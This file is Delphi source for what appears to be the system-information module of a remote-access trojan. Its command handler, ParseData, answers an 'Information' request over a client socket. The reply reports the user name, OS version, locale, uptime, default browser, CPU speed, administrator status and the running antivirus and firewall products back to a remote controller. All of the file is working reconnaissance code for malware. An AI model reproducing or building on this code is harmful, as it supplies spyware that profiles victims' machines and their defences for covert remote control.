unit UnitSystemInfo;

interface

uses
  applicationunit,windows,socketunit, unitshareddata, CompressionStreamUnit,ShlObj,ShFolder,
    ShellAPi, ImageHlp,UnitAVFWDetector, MiniReg;

{$IFDEF CONDITIONALEXPRESSIONS}
  {$IF Defined(TOSVersionInfoEx)}
    {$DEFINE TOSVERSIONINFOEX_DEFINED}
  {$IFEND}
{$ENDIF}
{$IFNDEF TOSVERSIONINFOEX_DEFINED}

type
  POSVersionInfoEx = ^TOSVersionInfoEx;
  TOSVersionInfoEx = packed record
    dwOSVersionInfoSize: DWORD;
    dwMajorVersion     : DWORD;
    dwMinorVersion     : DWORD;
    dwBuildNumber      : DWORD;
    dwPlatformId       : DWORD;
    szCSDVersion       : array [0..127] of AnsiChar;
    wServicePackMajor  : Word;
    wServicePackMinor  : Word;
    wSuiteMask         : Word;
    wProductType       : Byte;
    wReserved          : Byte;
  end;

const
  VER_SERVER_NT                       = $80000000;
  {$EXTERNALSYM VER_SERVER_NT}
  VER_WORKSTATION_NT                  = $40000000;
  {$EXTERNALSYM VER_WORKSTATION_NT}
  VER_SUITE_SMALLBUSINESS             = $00000001;
  {$EXTERNALSYM VER_SUITE_SMALLBUSINESS}
  VER_SUITE_ENTERPRISE                = $00000002;
  {$EXTERNALSYM VER_SUITE_ENTERPRISE}
  VER_SUITE_BACKOFFICE                = $00000004;
  {$EXTERNALSYM VER_SUITE_BACKOFFICE}
  VER_SUITE_COMMUNICATIONS            = $00000008;
  {$EXTERNALSYM VER_SUITE_COMMUNICATIONS}
  VER_SUITE_TERMINAL                  = $00000010;
  {$EXTERNALSYM VER_SUITE_TERMINAL}
  VER_SUITE_SMALLBUSINESS_RESTRICTED  = $00000020;
  {$EXTERNALSYM VER_SUITE_SMALLBUSINESS_RESTRICTED}
  VER_SUITE_EMBEDDEDNT                = $00000040;
  {$EXTERNALSYM VER_SUITE_EMBEDDEDNT}
  VER_SUITE_DATACENTER                = $00000080;
  {$EXTERNALSYM VER_SUITE_DATACENTER}
  VER_SUITE_SINGLEUSERTS              = $00000100;
  {$EXTERNALSYM VER_SUITE_SINGLEUSERTS}
  VER_SUITE_PERSONAL                  = $00000200;
  {$EXTERNALSYM VER_SUITE_PERSONAL}
  VER_SUITE_BLADE                     = $00000400;
  {$EXTERNALSYM VER_SUITE_BLADE}
  VER_SUITE_EMBEDDED_RESTRICTED       = $00000800;
  {$EXTERNALSYM VER_SUITE_EMBEDDED_RESTRICTED}
  VER_SUITE_SECURITY_APPLIANCE        = $00001000;
  {$EXTERNALSYM VER_SUITE_SECURITY_APPLIANCE}

const
  VER_NT_WORKSTATION              = $0000001;
  {$EXTERNALSYM VER_NT_WORKSTATION}
  VER_NT_DOMAIN_CONTROLLER        = $0000002;
  {$EXTERNALSYM VER_NT_DOMAIN_CONTROLLER}
  VER_NT_SERVER                   = $0000003;
  {$EXTERNALSYM VER_NT_SERVER}

{$ENDIF}  // TOSVERSIONINFOEX_DEFINED

var
  IsNTAdmin: function(dwReserved: LongInt; lpdwReserved: LongInt): LongInt; stdcall;

Function AccountType: string;
function UserName: string;
function ComputerName: string ;
function Country: String;
function GetCPUSpeed: dword;
function RamSize: String;
function OperatingSystemBuild: string;
function Language: String;
function OperatingSystem: string;
function GetBrowser: string;
function CountryCode: String;


procedure ParseData(Socket: TClientSocket; Data: string); forward;

implementation

procedure SendData(Socket: TClientSocket; Data: string);
begin
  UnitSharedData.SendData(Socket,'SystemInfo|' + Data);
end;

function ComputerName: string ;
var
	Size : Dword ;
	Buffer : array [0..255] of char ;
begin
	Size := 256 ;
	GetComputerName(Buffer,Size);
	Result := Buffer ;
end;

function UserName: string;
var
	Size : Dword ;
	Buffer : array [0..255] of char ;
begin
	Size := 256;
	GetUserName(Buffer,Size);
	Result := Buffer ;
end;



function MSecToTime(mSec: Int64): string;
const
  ticksperday: Integer    = 1000 * 60 * 60 * 24;
  ticksperhour: Integer   = 1000 * 60 * 60;
  ticksperminute: Integer = 1000 * 60;
  tickspersecond: Integer = 1000;
var
  t: int64;
  d, h, m, s: Integer;
begin
  t := mSec;

  d := t div ticksperday;
  Dec(t, d * ticksperday);

  h := t div ticksperhour;
  Dec(t, h * ticksperhour);

  m := t div ticksperminute;
  Dec(t, m * ticksperminute);

  s := t div tickspersecond;

  Result := IntToStr(d) + ' Days ' + IntToStr(h) + ' Hours ' + IntToStr(m) +
    ' Minutes ' + IntToStr(s) + ' Seconds';

end;

function UpTime: string;
{const
  ticksperday: Integer    = 1000 * 60 * 60 * 24;
  ticksperhour: Integer   = 1000 * 60 * 60;
  ticksperminute: Integer = 1000 * 60;
  tickspersecond: Integer = 1000;
var
  t: Longword;
  d, h, m, s: Integer;}
begin
  Result := MSecToTime(GetTickCount);
  {t := GetTickCount;

  d := t div ticksperday;
  Dec(t, d * ticksperday);

  h := t div ticksperhour;
  Dec(t, h * ticksperhour);

  m := t div ticksperminute;
  Dec(t, m * ticksperminute);

  s := t div tickspersecond;

  Result := IntToStr(d) + ' Days ' + IntToStr(h) + ' Hours ' + IntToStr(m) +
    ' Minutes ' + IntToStr(s) + ' Seconds';}
end;

function OperatingSystemBuild: string;
var
  osVerInfo: TOSVersionInfo;
begin
  Result := 'Unknown';
  osVerInfo.dwOSVersionInfoSize := SizeOf(TOSVersionInfo);
  if GetVersionEx(osVerInfo) then  begin
    Result := inttostr(osVerInfo.dwBuildNumber);
  end;
end;

function ServicePack: string;
var
  osVerInfo: TOSVersionInfo;
begin
  osVerInfo.dwOSVersionInfoSize := SizeOf(TOSVersionInfo);
  GetVersionEx(osVerInfo);
  ServicePack := osVerInfo.szCSDVersion;
end;

function Language: String;
var
  Buffer: array[0..255] of char;
begin
  GetLocaleInfo(LOCALE_USER_DEFAULT,LOCALE_SENGLANGUAGE, Buffer,SizeOf(Buffer));
  Result := Buffer;
End;

function GetTime: string;
var
  MyTime: TSystemTime;
begin
  GetLocalTime(MyTime);

  if MyTime.wHour < 10 then begin
    Result := '0' + inttostr(MyTime.wHour);
  end else begin
    Result := Result + inttostr(MyTime.wHour);
  end;

  if MyTime.wMinute < 10 then begin
    Result := Result + ':0' + inttostr(MyTime.wMinute);
  end else begin
    Result := Result + '.' + inttostr(MyTime.wMinute);
  end;

  if MyTime.wSecond < 10 then begin
    Result := Result + ':0' + inttostr(MyTime.wSecond);
  end else begin
    Result := Result + ':' + inttostr(MyTime.wSecond);
  end;

end;

function GetDate: string;
var
  MyTime: TSystemTime;
begin
  GetLocalTime(MyTime);

  if MyTime.wDay < 10 then begin
    Result := '0' + inttostr(MyTime.wDay);
  end else begin
    Result := Result + inttostr(MyTime.wDay);
  end;

  if MyTime.wMonth < 10 then begin
    Result := Result + '\0' + inttostr(MyTime.wMonth);
  end else begin
    Result := Result + '\' + inttostr(MyTime.wMonth);
  end;

  if MyTime.wYear < 10 then begin
    Result := Result + '\0' + inttostr(MyTime.wYear);
  end else begin
    Result := Result + '\' + inttostr(MyTime.wYear);
  end;

end;


function ScreenRes: string;
begin
  Result := inttostr(GetSystemMetrics(SM_CXSCREEN)) + 'x' + inttostr(GetSystemMetrics(SM_CYSCREEN));
end;

{function OperatingSystem: string;
var
  osVerInfo: TOSVersionInfo;
  majorVer, minorVer: Integer;
begin
  Result := 'Unknown';
  osVerInfo.dwOSVersionInfoSize := SizeOf(TOSVersionInfo);
  if GetVersionEx(osVerInfo) then begin
    majorVer := osVerInfo.dwMajorVersion;
    minorVer := osVerInfo.dwMinorVersion;
    case osVerInfo.dwPlatformId of
      VER_PLATFORM_WIN32_NT:
        begin
          if majorVer <= 4 then Result := 'Windows NT'
          else if (majorVer = 5) and (minorVer = 0) then Result := 'Windows 2000'
          else if (majorVer = 5) and (minorVer = 2) then Result := 'Windows 2003'
          else if (majorVer = 5) and (minorVer = 1) then Result := 'Windows XP'
          else if (majorVer = 6) then Result := 'Windows Vista'
          else Result := 'Unknown';
        end;
      VER_PLATFORM_WIN32_WINDOWS:
        begin
          if (majorVer = 4) and (minorVer = 0) then Result := 'Windows 95'
          else if (majorVer = 4) and (minorVer = 10) then begin
            if osVerInfo.szCSDVersion[1] = 'A' then Result := 'Windows 98 se'
            else Result := 'Windows 98';
          end else if (majorVer = 4) and (minorVer = 90) then Result := 'Windows ME'
          else Result := 'Unknown';
        end;
      else Result := 'Unknown';
    end;
  end else Result := 'Unknown';
end; }

function GetOSVersionInfo(var Info: TOSVersionInfoEx): Boolean;
begin
  FillChar(Info, SizeOf(TOSVersionInfoEx), 0);
  Info.dwOSVersionInfoSize := SizeOf(TOSVersionInfoEx);
  Result := GetVersionEx(TOSVersionInfo(Addr(Info)^));
  if (not Result) then
  begin
    FillChar(Info, SizeOf(TOSVersionInfoEx), 0);
    Info.dwOSVersionInfoSize := SizeOf(TOSVersionInfoEx);
    Result := GetVersionEx(TOSVersionInfo(Addr(Info)^));
    if (not Result) then
      Info.dwOSVersionInfoSize := 0;
  end;
end;

function OperatingSystem: string;
var
  Info: TOSVersionInfoEx;
  Key: HKEY;
  ProductType: string;
begin
  Result := '';
  if (not GetOSVersionInfo(Info)) then Exit;
  case Info.dwPlatformId of

    { Win32s }
    VER_PLATFORM_WIN32s:
      Result := 'Win32';

    { Windows 9x }
    VER_PLATFORM_WIN32_WINDOWS:
      if (Info.dwMajorVersion = 4) and (Info.dwMinorVersion = 0) then begin
        Result := 'Windows 95';
        if (Info.szCSDVersion[1] in ['B', 'C']) then Result := Result +' OSR2';
      end else if (Info.dwMajorVersion = 4) and (Info.dwMinorVersion = 10) then begin
        Result := 'Windows 98';
        if (Info.szCSDVersion[1] = 'A') then Result := Result + ' se';
      end else if (Info.dwMajorVersion = 4) and (Info.dwMinorVersion = 90) then begin
        Result := 'Windows Me';
      end;

    { Windows NT }
    VER_PLATFORM_WIN32_NT:
      begin
        { Version }
        if (Info.dwMajorVersion = 5) and (Info.dwMinorVersion = 2) then Result := 'Windows Server 2003'
        else if (Info.dwMajorVersion = 5) and (Info.dwMinorVersion = 1) then Result := 'Windows XP'
        else if (Info.dwMajorVersion = 5) and (Info.dwMinorVersion = 0) then Result := 'Windows 2000'
        else if (Info.dwMajorVersion = 6) then Result := 'Windows Vista'
        else Result := 'Windows NT';

        { Extended }
        if (Info.dwOSVersionInfoSize >= SizeOf(TOSVersionInfoEx)) then begin

          { ProductType }
          if (Info.wProductType = VER_NT_WORKSTATION) then begin

            if MiniReg.RegGetString(HKEY_LOCAL_MACHINE,'SOFTWARE\Microsoft\Windows NT\CurrentVersion\EditionID',ProductType) then begin
              Result := Result + ' (' + ProductType + ')';
            end else begin
              if (Info.dwMajorVersion = 4) then Result := Result + ' (Workstation 4.0)'
              else if(Info.wSuiteMask and VER_SUITE_PERSONAL <> 0) then Result := Result + ' (Home Edition)'
              else Result := Result + ' (Professional)';
            end;
          end;

          if (Info.wProductType = VER_NT_SERVER) then begin
            if (Info.dwMajorVersion = 5) and (Info.dwMinorVersion = 2) then begin
               if (Info.wSuiteMask and VER_SUITE_DATACENTER <> 0) then Result := Result + ' (Datacenter Edition)'
               else if (Info.wSuiteMask and VER_SUITE_ENTERPRISE <> 0) then Result := Result + ' (Enterprise Edition)'
               else if (Info.wSuiteMask = VER_SUITE_BLADE) then Result := Result + ' (Web Edition)'
               else Result := Result + ' (Standard Edition)';
             end
          else if (Info.dwMajorVersion = 5) and (Info.dwMinorVersion = 0) then begin
            if (Info.wSuiteMask and VER_SUITE_DATACENTER <> 0) then Result := Result + ' (Datacenter Server)'
              else if (Info.wSuiteMask and VER_SUITE_ENTERPRISE <> 0) then Result := Result + ' (Advanced Server)'
              else Result := Result + ' (Server)';
            end
          else begin
            Result := Result + ' (Server ' + IntToStr(Info.dwMajorVersion) + '.' + IntToStr(Info.dwMinorVersion) + ')';
            if (Info.wSuiteMask and VER_SUITE_ENTERPRISE <> 0) then Result := Result + ' (Enterprise Edition)';
          end;
        end;

      end;

      end;
  end;
end;


function CountryCode: String;
var
  Buffer: array[0..255] of char;
begin
  GetLocaleInfo(LOCALE_USER_DEFAULT,LOCALE_SISO3166CTRYNAME, Buffer,SizeOf(Buffer));
  Result := Buffer;
End;

function Country: String;
var
  Buffer: array[0..255] of char;
begin
  GetLocaleInfo(LOCALE_USER_DEFAULT,LOCALE_SENGCOUNTRY, Buffer,SizeOf(Buffer));
  Result := Buffer;
End;

Function AccountType: string;
begin
  result := 'Unknown';
  if @IsNTAdmin = nil then begin
    LoadLibrary('advpack');
    @IsNTAdmin := GetProcAddress(getmodulehandle('advpack'),'IsNTAdmin');
  end;
  if @IsNTAdmin = nil then exit;
  if IsNTAdmin(0, 0) <> 0 then Result := 'Administrator'
  else Result := 'Limited';
end;

function GetCPUSpeed: dword;
//var
  //TimerHi, TimerLo: DWORD;
  //PriorityClass, Priority: Integer;
begin
  MiniReg.RegGetDWORD(HKEY_LOCAL_MACHINE,'HARDWARE\DESCRIPTION\System\CentralProcessor\0\~MHz',Result);
  {PriorityClass := GetPriorityClass(GetCurrentProcess);
  Priority := GetThreadPriority(GetCurrentThread);
  SetPriorityClass(GetCurrentProcess, REALTIME_PRIORITY_CLASS);
  SetThreadPriority(GetCurrentThread, THREAD_PRIORITY_TIME_CRITICAL);
  Sleep(10);
  asm
    dw 310Fh
    mov TimerLo, eax
    mov TimerHi, edx
    push 500
    call Sleep
    dw 310Fh
    sub eax, TimerLo
    sbb edx, TimerHi
    mov TimerLo, eax
    mov TimerHi, edx
  end;
  SetThreadPriority(GetCurrentThread, Priority);
  SetPriorityClass(GetCurrentProcess, PriorityClass);
  Result := Round(TimerLo / (500000));}
end;

function RamSize: String;
var
  MemoryStatus: TMemoryStatus;
  Stream: TMemoryStream;
  n: int64;
begin
  GlobalMemoryStatus(MemoryStatus);

  //n := High(Int64);
  n := MemoryStatus.dwTotalPhys;

  Stream := TMemoryStream.Create;
  Stream.Write(n,sizeof(n));
  SetString(Result,pchar(Stream.memory),stream.size);
  Stream.Free;

  //Result := MemoryStatus.dwTotalPhys div 1024;
end;

function GetBrowser: string;
var
  B: array[0..255] of char;
  handle: integer;
  filename: string;
begin
  filename := 'tmp.htm';
  handle := createfile(pchar(Filename),GENERIC_WRITE,0,nil,CREATE_ALWAYS,FILE_ATTRIBUTE_HIDDEN, 0);
  CloseHandle(handle);
  FindExecutable(pchar(Filename),'',b);
  DeleteFile(pchar(Filename));
  Result := b;
end;

procedure ParseData(Socket: TClientSocket; Data: string);
var
  Command: string;
  s: string;
begin
  Command := Split(Data,'|',1);
  Delete(Data,1,Length(Command)+1);

  if Command = 'Information' then begin
    s := s + UserName + #13#10;
    s := s + OperatingSystem + #13#10;
    s := s + OperatingSystemBuild + #13#10;
    s := s + ServicePack + #13#10;
    s := s + Country + #13#10;
    s := s + Language + #13#10;
    s := s + GetDate + #13#10;
    s := s + GetTime + #13#10;

    s := s + ScreenRes + #13#10;
    s := s + UpTime + #13#10;
    s := s + GetBrowser + #13#10;
    s := s + inttostr(GetCPUSpeed) + ' Mhz' + #13#10;
    s := s + AccountType + #13#10;
    s := s + GetRunningAntiviruses + #13#10;
    s := s + GetRunningFirewalls + #13#10;

    s := s + MSecToTime(GetTickCount - StartedAt) + #13#10;


    SendData(Socket,Command + '|' + s);
  end;

end;

end.
